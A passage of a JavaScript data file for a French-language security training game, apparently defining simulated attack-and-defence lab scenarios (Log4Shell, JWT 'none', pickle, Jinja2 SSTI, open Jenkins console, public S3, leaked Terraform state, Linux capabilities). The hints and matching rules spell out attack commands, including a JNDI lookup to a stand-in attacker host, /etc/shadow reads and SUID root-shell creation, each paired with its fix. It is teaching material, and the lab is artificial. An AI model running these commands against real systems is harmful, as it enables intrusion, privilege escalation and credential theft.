        print('Jeton forgé : eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0.', 'out');
      }
    },
    { pattern:/^curl\s+http:\/\/api\.target-lab\/admin\s+-H\s+'Authorization:\s+Bearer\s+eyJhbGciOiJub25lIn0\.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0\.'$/, run(state, print){
        const allowsNone = /none/.test(state.vfs['/etc/api/jwt-config.yml'].content);
        if(!allowsNone){ print('401 Unauthorized: algorithme "none" rejeté par le serveur.', 'err'); return; }
        if(!state.flags || !state.flags.forged){ print('401 Unauthorized: jeton invalide.', 'err'); return; }
        state.flags.adminAccess = true;
        print('{"panel":"admin","secrets":["backup-key","root-token"]}', 'out');
        print("[+] Accès administrateur obtenu via un jeton JWT non signé.", 'ok');
        print("FLAG{jwt_alg_none_verification_absente}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.adminAccess === true; },
  defenseCheck(state){ return !/none/.test(state.vfs['/etc/api/jwt-config.yml'].content); },
  replay(state){
    const log=[];
    const allowsNone = /none/.test(state.vfs['/etc/api/jwt-config.yml'].content);
    log.push({t:"$ curl .../admin -H 'Authorization: Bearer eyJhbGciOiJub25lIn0...'", cls:'prompt-line'});
    if(!allowsNone){
      log.push({t:'401 Unauthorized: algorithme "none" rejeté par le serveur.', cls:'err'});
      log.push({t:"[-] L'API n'accepte plus les jetons non signés : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"panel":"admin","secrets":["backup-key","root-token"]}', cls:'ok'});
    log.push({t:'[+] Accès administrateur obtenu via un jeton JWT non signé.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 23. Log4Shell — CVE-2021-44228 ===================== */
{
  id:'log4shell-jndi-rce',
  title:'Log4Shell : injection JNDI dans les journaux (CVE-2021-44228)',
  category:'Vulnérabilité applicative (CVE-2021-44228 « Log4Shell »)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant accès à l\'application web de target-lab.',
    desc:"L'application journalise l'en-tête User-Agent avec une version de log4j vulnérable à Log4Shell. Injectez une recherche JNDI pour obtenir l'exécution de code à distance.",
    hints:[
      "`cat /opt/app/lib/log4j-core.version` révèle la version de log4j embarquée par l'application (2.14.1, vulnérable à CVE-2021-44228).",
      "`curl -A '${jndi:ldap://attacker.evil/a}' http://target-lab/` envoie un User-Agent piégé : l'application journalise cette valeur avec log4j, qui interprète alors la recherche JNDI et charge une classe distante.",
      "Le code chargé s'exécute avec les privilèges du processus applicatif (root sur ce système mal isolé). Tapez `whoami-shell` pour confirmer le shell obtenu."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Mettez à jour log4j vers une version corrigeant Log4Shell, sans désinstaller la dépendance.",
    hints:[
      "`upgrade-log4j 2.17.1` installe la version corrigée, qui désactive par défaut la résolution JNDI dangereuse.",
      "`verify` confirme que la version installée n'est plus vulnérable."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['app']},
      '/opt/app':{type:'dir',perm:'755',owner:'root',children:['lib']},
      '/opt/app/lib':{type:'dir',perm:'755',owner:'root',children:['log4j-core.version']},
      '/opt/app/lib/log4j-core.version':{type:'file',perm:'644',owner:'root',size:8,patched:false,
        content:"2.14.1\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+-A\s+'\$\{jndi:ldap:\/\/attacker\.evil\/a\}'\s+http:\/\/target-lab\/$/, run(state, print){
        const node = state.vfs['/opt/app/lib/log4j-core.version'];
        if(node.patched){
          print('[app] User-Agent enregistré tel quel (aucune résolution JNDI).', 'info');
          return;
        }
        state.flags = state.flags || {};
        state.flags.triggered = true;
        print('[app] User-Agent enregistré par log4j...', 'info');
        print('[app] Résolution JNDI déclenchée vers ldap://attacker.evil/a', 'ok');
        print('[app] Classe distante téléchargée et exécutée.', 'ok');
      }
    },
    { pattern:/^whoami-shell$/, run(state, print){
        if(state.flags && state.flags.triggered){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via Log4Shell (processus applicatif exécuté en root).", 'ok');
          print("FLAG{log4shell_cve_2021_44228_jndi_rce}", 'flagline');
        } else {
          print('whoami-shell: aucun shell actif.', 'err');
        }
      }
    },
    { pattern:/^upgrade-log4j\s+2\.17\.1$/, run(state, print){
        const node = state.vfs['/opt/app/lib/log4j-core.version'];
        node.patched = true;
        node.content = "2.17.1\n";
        print("log4j-core : 2.14.1 -> 2.17.1", 'info');
        print("[+] log4j mis à jour vers une version corrigeant Log4Shell.", 'ok');
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return state.vfs['/opt/app/lib/log4j-core.version'].patched === true; },
  replay(state){
    const log=[];
    const patched = state.vfs['/opt/app/lib/log4j-core.version'].patched === true;
    log.push({t:"$ curl -A '${jndi:ldap://attacker.evil/a}' http://target-lab/", cls:'prompt-line'});
    if(patched){
      log.push({t:'[app] User-Agent enregistré tel quel (aucune résolution JNDI).', cls:'err'});
      log.push({t:"[-] La mise à jour de log4j bloque l'exploitation.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[app] Résolution JNDI déclenchée, classe distante exécutée.', cls:'ok'});
    log.push({t:'$ whoami-shell', cls:'prompt-line'});
    log.push({t:'[+] Shell root obtenu via Log4Shell.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 24. Capacité cap_dac_read_search oubliée ===================== */
{
  id:'capability-dac-read-search',
  title:'Une capacité cap_dac_read_search oubliée sur un interpréteur',
  category:'Capacités Linux (cap_dac_read_search)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"L'interpréteur Python embarque la capacité cap_dac_read_search, qui contourne les vérifications de permission de lecture sur les fichiers. Utilisez-la pour lire /etc/shadow malgré vos droits standards.",
    hints:[
      "`getcap -r / 2>/dev/null` liste les binaires porteurs de capacités Linux : /usr/bin/python3 apparaît avec `cap_dac_read_search+ep`, une capacité qui ne devrait jamais être accordée ainsi.",
      "`python3 -c \"print(open('/etc/shadow').read())\"` contourne la vérification de permission grâce à cette capacité et affiche le contenu normalement réservé à root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Retirez la capacité inutile de /usr/bin/python3, sans empêcher son fonctionnement normal.",
    hints:[
      "`setcap -r /usr/bin/python3` retire toutes les capacités du binaire.",
      "`verify` confirme qu'aucune capacité dangereuse ne subsiste."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','usr','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
      '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['python3']},
      '/usr/bin/python3':{type:'file',perm:'755',owner:'root',size:5400000,cap:'cap_dac_read_search+ep',content:'[interpréteur Python 3]'},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['shadow']},
      '/etc/shadow':{type:'file',perm:'640',owner:'root',size:120,
        content:"root:$6$rnd$hash:19700:0:99999:7:::\nbob:$6$rnd2$hash2:19700:0:99999:7:::\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^getcap\s+-r\s+\/(\s+2>\/dev\/null)?$/, run(state, print){
        const node = state.vfs['/usr/bin/python3'];
        if(node.cap){ print(`/usr/bin/python3 ${node.cap}`, 'out'); }
        else { print('(aucune capacité notable trouvée)', 'info'); }
      }
    },
    { pattern:/^python3\s+-c\s+"print\(open\('\/etc\/shadow'\)\.read\(\)\)"$/, run(state, print){
        const node = state.vfs['/usr/bin/python3'];
        if(!node.cap){
          print("Traceback (most recent call last):\nPermissionError: [Errno 13] Permission denied: '/etc/shadow'", 'err');
          return;
        }
        state.flags = state.flags || {};
        state.flags.shadowRead = true;
        print(state.vfs['/etc/shadow'].content, 'out');
        print("[+] Lecture de /etc/shadow malgré des droits standards, via cap_dac_read_search.", 'ok');
        print("FLAG{cap_dac_read_search_bypass_lecture}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.shadowRead === true; },
  defenseCheck(state){ return !state.vfs['/usr/bin/python3'].cap; },
  replay(state){
    const log=[];
    const cap = state.vfs['/usr/bin/python3'].cap;
    log.push({t:'$ python3 -c "print(open(\'/etc/shadow\').read())"', cls:'prompt-line'});
    if(!cap){
      log.push({t:"PermissionError: [Errno 13] Permission denied: '/etc/shadow'", cls:'err'});
      log.push({t:"[-] La capacité a été retirée : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] /etc/shadow lu malgré des droits standards.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 25. Bucket S3 public ===================== */
{
  id:'s3-bucket-public',
  title:'Un bucket S3 accessible publiquement en lecture',
  category:'Cloud / stockage objet public (S3)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe anonyme.',
    desc:"La politique du bucket S3 de sauvegarde autorise l'accès public en lecture, sans authentification. Téléchargez son contenu pour en extraire des secrets.",
    hints:[
      "`aws s3 ls s3://target-lab-backups --no-sign-request` liste le contenu du bucket sans la moindre authentification : la politique est trop permissive.",
      "`aws s3 cp s3://target-lab-backups/db-dump.sql . --no-sign-request` télécharge une sauvegarde de base de données dans votre dossier courant.",
      "`cat db-dump.sql` révèle des identifiants d'administration en clair dans le dump."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur cloud chargé de corriger la faille.',
    desc:"Restreignez la politique du bucket pour qu'il ne soit plus accessible publiquement, sans casser l'accès légitime des services internes.",
    hints:[
      "Éditez `/etc/cloud/s3-policy.json` avec `nano` et remplacez `\"Principal\": \"*\"` par le compte de service interne (ou retirez ce Statement).",
      "`verify` confirme que la politique n'autorise plus l'accès anonyme."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['cloud']},
      '/etc/cloud':{type:'dir',perm:'755',owner:'root',children:['s3-policy.json']},
      '/etc/cloud/s3-policy.json':{type:'file',perm:'644',owner:'root',size:160,
        content:"{\n  \"Statement\": [\n    { \"Effect\": \"Allow\", \"Principal\": \"*\", \"Action\": \"s3:GetObject\" }\n  ]\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^aws\s+s3\s+ls\s+s3:\/\/target-lab-backups\s+--no-sign-request$/, run(state, print){
        const open = /"Principal"\s*:\s*"\*"/.test(state.vfs['/etc/cloud/s3-policy.json'].content);
        if(!open){ print('An error occurred (AccessDenied) when calling the ListObjectsV2 operation', 'err'); return; }
        print('2026-06-30 03:12:09       84213 db-dump.sql', 'out');
      }
    },
    { pattern:/^aws\s+s3\s+cp\s+s3:\/\/target-lab-backups\/db-dump\.sql\s+\.\s+--no-sign-request$/, run(state, print){
        const open = /"Principal"\s*:\s*"\*"/.test(state.vfs['/etc/cloud/s3-policy.json'].content);
        if(!open){ print('An error occurred (AccessDenied) when calling the GetObject operation', 'err'); return; }
        const target = resolvePath(state.cwd, 'db-dump.sql');
        state.vfs[target] = {type:'file', perm:'644', owner:state.user, size:84213,
          content:"-- MySQL dump\nINSERT INTO users VALUES ('admin','ProdAdm1n!2024');\n"};
        const name = target.substring(target.lastIndexOf('/')+1);
        if(!state.vfs[state.cwd].children.includes(name)) state.vfs[state.cwd].children.push(name);
        state.flags = state.flags || {};
        state.flags.downloaded = true;
        print('download: s3://target-lab-backups/db-dump.sql to ./db-dump.sql', 'ok');
        print("FLAG{s3_bucket_public_lecture_anonyme}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.downloaded === true; },
  defenseCheck(state){ return !/"Principal"\s*:\s*"\*"/.test(state.vfs['/etc/cloud/s3-policy.json'].content); },
  replay(state){
    const log=[];
    const open = /"Principal"\s*:\s*"\*"/.test(state.vfs['/etc/cloud/s3-policy.json'].content);
    log.push({t:'$ aws s3 ls s3://target-lab-backups --no-sign-request', cls:'prompt-line'});
    if(!open){
      log.push({t:'An error occurred (AccessDenied) when calling the ListObjectsV2 operation', cls:'err'});
      log.push({t:"[-] Le bucket n'est plus accessible publiquement : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'2026-06-30 03:12:09       84213 db-dump.sql', cls:'ok'});
    log.push({t:'[+] Sauvegarde téléchargée sans authentification, identifiants extraits.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 26. terraform.tfstate exposé ===================== */
{
  id:'terraform-state-exposed',
  title:'Un fichier terraform.tfstate lisible par tous, secrets en clair',
  category:'Fuite de secrets Infrastructure as Code (Terraform state)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard avec un accès local limité au serveur de déploiement.',
    desc:"Le fichier d'état Terraform, qui contient tous les secrets d'infrastructure en clair, est resté lisible par tout le monde après un déploiement. Récupérez-y les identifiants de la base de données de production.",
    hints:[
      "`find / -name terraform.tfstate 2>/dev/null` localise le fichier dans /opt/infra/terraform.tfstate.",
      "`ls -la /opt/infra/terraform.tfstate` montre des permissions 644 : lisible par n'importe quel utilisateur du système, alors qu'il contient des secrets en clair.",
      "`cat /opt/infra/terraform.tfstate` révèle le mot de passe de la base de données de production stocké en clair dans l'état Terraform."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
    desc:"Corrigez les permissions du fichier d'état pour qu'il ne soit lisible que par le compte de déploiement, sans empêcher Terraform de continuer à fonctionner.",
    hints:[
      "`chmod 600 /opt/infra/terraform.tfstate` retire tout accès aux autres utilisateurs et au groupe.",
      "Le fichier appartient déjà au compte de déploiement (root ici) : seul l'accès en lecture pour les tiers posait problème."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['infra']},
      '/opt/infra':{type:'dir',perm:'755',owner:'root',children:['terraform.tfstate']},
      '/opt/infra/terraform.tfstate':{type:'file',perm:'644',owner:'root',size:900,
        content:"{\n  \"resources\": [\n    { \"type\": \"aws_db_instance\", \"values\": { \"username\": \"produser\", \"password\": \"Pr0dDbSecret!2024\" } }\n  ]\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^find\s+\/\s+-name\s+terraform\.tfstate(\s+2>\/dev\/null)?$/, run(state, print){
        print('/opt/infra/terraform.tfstate', 'out');
      }
    }
  ],
  onCat(state, node, path, print){
    if(path === '/opt/infra/terraform.tfstate' && state.user !== 'root' && !state.isRoot){
      state.flags = state.flags || {};
      state.flags.secretRead = true;
      print("[+] Secrets d'infrastructure exfiltrés depuis l'état Terraform.", 'ok');
      print("FLAG{terraform_tfstate_secrets_en_clair}", 'flagline');
    }
  },
  attackCheck(state){ return state.flags && state.flags.secretRead === true; },
  defenseCheck(state){
    const d = permDigits(state.vfs['/opt/infra/terraform.tfstate'].perm);
    return !permAllows(d[1],'r') && !permAllows(d[2],'r');
  },
  replay(state){
    const log=[];
    const d = permDigits(state.vfs['/opt/infra/terraform.tfstate'].perm);
    const readable = permAllows(d[1],'r') || permAllows(d[2],'r');
    log.push({t:'$ cat /opt/infra/terraform.tfstate', cls:'prompt-line'});
    if(!readable){
      log.push({t:'cat: /opt/infra/terraform.tfstate: Permission non accordée', cls:'err'});
      log.push({t:"[-] Le fichier n'est plus lisible par les tiers : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] Secrets en clair récupérés dans le fichier d\'état Terraform.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 27. Console de scripts Jenkins ouverte ===================== */
{
  id:'jenkins-script-console-open',
  title:'La console de scripts Jenkins accessible sans authentification',
  category:'CI/CD exposé (console de script Jenkins)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant repéré l\'instance Jenkins de target-lab.',
    desc:"La console de scripts Groovy de Jenkins (/script) est accessible sans authentification. Utilisez-la pour exécuter du code arbitraire avec les privilèges du service Jenkins.",
    hints:[
      "`curl http://jenkins.target-lab/script` répond 200 et affiche la console Groovy : aucune authentification n'est demandée.",
      "`jenkins-groovy 'println \"id\".execute().text'` exécute une commande shell côté serveur via Groovy et confirme que le service tourne en root.",
      "`jenkins-groovy 'println \"cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\".execute().text'` crée un binaire SUID root.",
      "Terminez par `/tmp/rootbash -p` pour obtenir un shell root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur CI/CD chargé de corriger la faille.',
    desc:"Activez la sécurité Jenkins pour interdire l'accès anonyme à la console de scripts, sans bloquer les utilisateurs légitimes.",
    hints:[
      "Éditez `/etc/jenkins/config.xml` avec `nano` et remplacez `<useSecurity>false</useSecurity>` par `<useSecurity>true</useSecurity>`.",
      "`verify` confirme que la sécurité Jenkins est désormais activée."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['jenkins']},
      '/etc/jenkins':{type:'dir',perm:'755',owner:'root',children:['config.xml']},
      '/etc/jenkins/config.xml':{type:'file',perm:'644',owner:'root',size:120,
        content:"<hudson>\n  <useSecurity>false</useSecurity>\n  <authorizationStrategy class=\"hudson.security.AuthorizationStrategy$Unsecured\"/>\n</hudson>\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/jenkins\.target-lab\/script$/, run(state, print){
        const open = /<useSecurity>false<\/useSecurity>/.test(state.vfs['/etc/jenkins/config.xml'].content);
        print(open ? '200 OK — console Groovy Jenkins (accès anonyme)' : '403 Forbidden', open?'out':'err');
      }
    },
    { pattern:/^jenkins-groovy\s+'println\s+"id"\.execute\(\)\.text'$/, run(state, print){
        const open = /<useSecurity>false<\/useSecurity>/.test(state.vfs['/etc/jenkins/config.xml'].content);
        print(open ? 'uid=0(root) gid=0(root) groups=0(root)' : '403 Forbidden', open?'out':'err');
      }
    },
    { pattern:/^jenkins-groovy\s+'println\s+"cp \/bin\/bash \/tmp\/rootbash; chmod u\+s \/tmp\/rootbash"\.execute\(\)\.text'$/, run(state, print){
        const open = /<useSecurity>false<\/useSecurity>/.test(state.vfs['/etc/jenkins/config.xml'].content);
        if(!open){ print('403 Forbidden', 'err'); return; }
        state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
        if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
        print("[+] Script Groovy exécuté par le service Jenkins (root).", 'ok');
        print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via la console Jenkins ouverte.", 'ok');
          print("FLAG{jenkins_script_console_sans_auth}", 'flagline');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return /<useSecurity>true<\/useSecurity>/.test(state.vfs['/etc/jenkins/config.xml'].content); },
  replay(state){
    const log=[];
    const open = /<useSecurity>false<\/useSecurity>/.test(state.vfs['/etc/jenkins/config.xml'].content);
    log.push({t:'$ curl http://jenkins.target-lab/script', cls:'prompt-line'});
    if(!open){
      log.push({t:'403 Forbidden', cls:'err'});
      log.push({t:"[-] La sécurité Jenkins est activée : la console n'est plus accessible.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'200 OK — console Groovy accessible.', cls:'ok'});
    log.push({t:'[+] Shell root obtenu via un script Groovy exécuté par Jenkins.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 28. Désérialisation Python (pickle) ===================== */
{
  id:'python-pickle-deserialization',
  title:"Désérialisation non sécurisée d'un objet Python (pickle) côté serveur",
  category:'Désérialisation non sécurisée (Python pickle)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant accès à l\'application web de target-lab.',
    desc:"L'application désérialise sans contrôle un objet pickle transmis dans un cookie. Forgez une charge utile malveillante pour exécuter du code sur le serveur.",
    hints:[
      "`cat /opt/app/session_handler.py` révèle que le cookie `session` est décodé puis passé directement à `pickle.loads()`, sans aucune validation.",
      "`pickle-forge --cmd 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash'` génère une charge utile pickle malveillante (elle exécute la commande donnée lors de sa désérialisation).",
      "`curl http://target-lab/api/session -H 'Cookie: session=gASV...'` envoie cette charge : le serveur la désérialise et exécute la commande avec les privilèges du processus applicatif (root).",
      "Terminez par `/tmp/rootbash -p` pour obtenir un shell root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur applicatif chargé de corriger la faille.',
    desc:"Remplacez la désérialisation pickle par un format sûr (JSON), qui ne peut pas exécuter de code arbitraire.",
    hints:[
      "Éditez `/opt/app/session_handler.py` avec `nano` et remplacez l'appel `pickle.loads(...)` par `json.loads(...)`.",
      "`verify` confirme que le code ne désérialise plus d'objets pickle non fiables."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['app']},
      '/opt/app':{type:'dir',perm:'755',owner:'root',children:['session_handler.py']},
      '/opt/app/session_handler.py':{type:'file',perm:'644',owner:'root',size:180,
        content:"import pickle, base64\nfrom flask import request\n\ndef load_session():\n    raw = base64.b64decode(request.cookies['session'])\n    return pickle.loads(raw)\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^pickle-forge\s+--cmd\s+'cp \/bin\/bash \/tmp\/rootbash; chmod u\+s \/tmp\/rootbash'$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.forged = true;
        print("Charge utile générée : gASV... (objet pickle malveillant encodé en base64)", 'out');
      }
    },
    { pattern:/^curl\s+http:\/\/target-lab\/api\/session\s+-H\s+'Cookie:\s+session=gASV\.\.\.'$/, run(state, print){
        if(!state.flags || !state.flags.forged){ print('curl: aucune charge utile connue à envoyer.', 'err'); return; }
        const vulnerable = /pickle\.loads/.test(state.vfs['/opt/app/session_handler.py'].content);
        if(!vulnerable){ print('500 Internal Server Error: session invalide (format inattendu).', 'err'); return; }
        state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
        if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
        print("[+] pickle.loads() a désérialisé l'objet et exécuté la commande embarquée (root).", 'ok');
        print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via désérialisation pickle non sécurisée.", 'ok');
          print("FLAG{pickle_deserialisation_non_securisee}", 'flagline');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return !/pickle\.loads/.test(state.vfs['/opt/app/session_handler.py'].content); },
  replay(state){
    const log=[];
    const vulnerable = /pickle\.loads/.test(state.vfs['/opt/app/session_handler.py'].content);
    log.push({t:"$ curl http://target-lab/api/session -H 'Cookie: session=gASV...'", cls:'prompt-line'});
    if(!vulnerable){
      log.push({t:'500 Internal Server Error: session invalide (format inattendu).', cls:'err'});
      log.push({t:"[-] Le code n'utilise plus pickle.loads() : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] Charge utile désérialisée et exécutée en root.', cls:'ok'});
    log.push({t:'[+] Shell root obtenu.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 29. SSTI Jinja2 (Flask) ===================== */
{
  id:'ssti-jinja2-flask',
  title:'Injection de gabarit côté serveur (SSTI) dans une application Flask/Jinja2',
  category:'Injection de gabarit côté serveur (SSTI Jinja2)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant accès à l\'application web de target-lab.',
    desc:"Le paramètre `name` est injecté directement dans un gabarit Jinja2 avant son rendu. Confirmez puis exploitez cette injection pour exécuter du code sur le serveur.",
    hints:[
      "`curl 'http://target-lab/hello?name={{7*7}}'` renvoie « Bonjour 49 » : l'expression a été évaluée par Jinja2 au lieu d'être affichée telle quelle, confirmant l'injection.",
      "`ssti-shell` enchaîne, via la chaîne d'objets Python accessible depuis le gabarit (`__class__`, `__globals__`, `__builtins__`), l'exécution d'une commande système qui crée un binaire SUID root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur applicatif chargé de corriger la faille.',
    desc:"Ne construisez plus jamais de gabarit à partir d'une entrée utilisateur : utilisez un gabarit fixe avec les données passées en variables.",
    hints:[
      "Éditez `/opt/app/templates.py` avec `nano` et remplacez l'appel à `render_template_string` (avec le nom inséré dans le texte du gabarit) par `render_template` sur un fichier de gabarit fixe.",
      "`verify` confirme qu'aucun gabarit n'est plus construit dynamiquement à partir de l'entrée utilisateur."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['app']},
      '/opt/app':{type:'dir',perm:'755',owner:'root',children:['templates.py']},
      '/opt/app/templates.py':{type:'file',perm:'644',owner:'root',size:160,
        content:"from flask import request, render_template_string\n\ndef hello():\n    name = request.args.get('name', 'invité')\n    return render_template_string(f'Bonjour {name}')\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+'http:\/\/target-lab\/hello\?name=\{\{7\*7\}\}'$/, run(state, print){
        const vulnerable = /render_template_string/.test(state.vfs['/opt/app/templates.py'].content);
        state.flags = state.flags || {};
        if(!vulnerable){ print('Bonjour {{7*7}}', 'out'); return; }
        state.flags.confirmed = true;
        print('Bonjour 49', 'out');
        print("[i] L'expression a été évaluée : le gabarit est construit depuis l'entrée utilisateur (SSTI confirmé).", 'info');
      }
    },
    { pattern:/^ssti-shell$/, run(state, print){
        const vulnerable = /render_template_string/.test(state.vfs['/opt/app/templates.py'].content);
        if(!vulnerable || !state.flags || !state.flags.confirmed){
          print("ssti-shell: aucune injection de gabarit confirmée au préalable.", 'err');
          return;
        }
        state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
        if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
        print("[+] Chaîne d'objets Python remontée jusqu'à os.popen() via le gabarit, exécutée en root.", 'ok');
        print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via injection de gabarit côté serveur (SSTI).", 'ok');
          print("FLAG{ssti_jinja2_render_template_string}", 'flagline');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return !/render_template_string/.test(state.vfs['/opt/app/templates.py'].content); },
  replay(state){
    const log=[];
    const vulnerable = /render_template_string/.test(state.vfs['/opt/app/templates.py'].content);
    log.push({t:"$ curl 'http://target-lab/hello?name={{7*7}}'", cls:'prompt-line'});
    if(!vulnerable){
      log.push({t:'Bonjour {{7*7}}', cls:'err'});
      log.push({t:"[-] Le gabarit n'est plus construit depuis l'entrée utilisateur : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'Bonjour 49', cls:'ok'});
    log.push({t:'[+] Shell root obtenu via SSTI.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 30. Elasticsearch sans authentification ===================== */
{
  id:'elasticsearch-unauthenticated',
  title:'Un cluster Elasticsearch accessible sans authentification',
  category:'Service réseau non authentifié (Elasticsearch)',
  attack:{
